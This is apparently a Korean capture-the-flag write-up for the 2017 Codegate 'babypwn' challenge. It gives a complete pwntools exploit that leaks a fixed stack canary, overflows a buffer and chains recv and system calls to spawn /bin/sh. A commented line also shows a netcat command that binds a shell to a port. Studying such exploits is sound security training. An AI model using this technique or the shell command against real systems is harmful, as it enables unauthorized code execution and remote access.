---
title: "2017 Codegate babypwn"
date: 2019-11-4
tags: [Codegate]
categories: [Pwn]
---

Reverse Shell을 열어서 풀면 된다.

canary leak해주면 되는데 이 바이너리를 보면 fork되어 있는 것을 알 수 있다. 그래서 canary값은 고정이다.

nc 접속해서 ret 전까지 카나리 값 맞춰주면서 덮어주고 recv함수 이용해서 bss영역에 /bin/sh (리버스쉘) 넣은 다음에 system함수로 실행시키면 된다.

> 1. Canary Leak
>
> 2. bof -> rop
>
> 3. rop chain -> recv(4,bss,/bin/sh,0)
>
> 4. system(bss)

```python
# -*-coding:utf-8-*- 
from pwn import *
 
e = ELF('./babypwn')
p = remote('localhost',8181)
r = ROP(e)
cmd = '/bin/sh'
# cmd = nc -lvp localhost 1234 -e /bin/sh
 
# canary leak
p.sendlineafter('> ','1')
p.sendlineafter(': ','A'*40)
p.recv(41)
canary = u32('\x00'+p.recv(3))
log.info('Canary : ' + hex(canary)) # canary 주소는 고정 fork 사용해서
 
p.close()

# solve
p = remote('localhost',8181)
bss = e.bss()

p.sendlineafter('> ','1')
 
# dummy(52) + sfp(4) + ret
pay = 'A'*40
pay += p32(canary)
pay += 'A'*12
r.recv(4,bss,len(cmd)+2,0)
r.system(bss)
pay += r.chain()
 
p.sendafter(': ',pay)
 
p.recvuntil('> ')
p.sendline('3')
sleep(0.3)
p.sendline(cmd)
 
p.interactive()
```

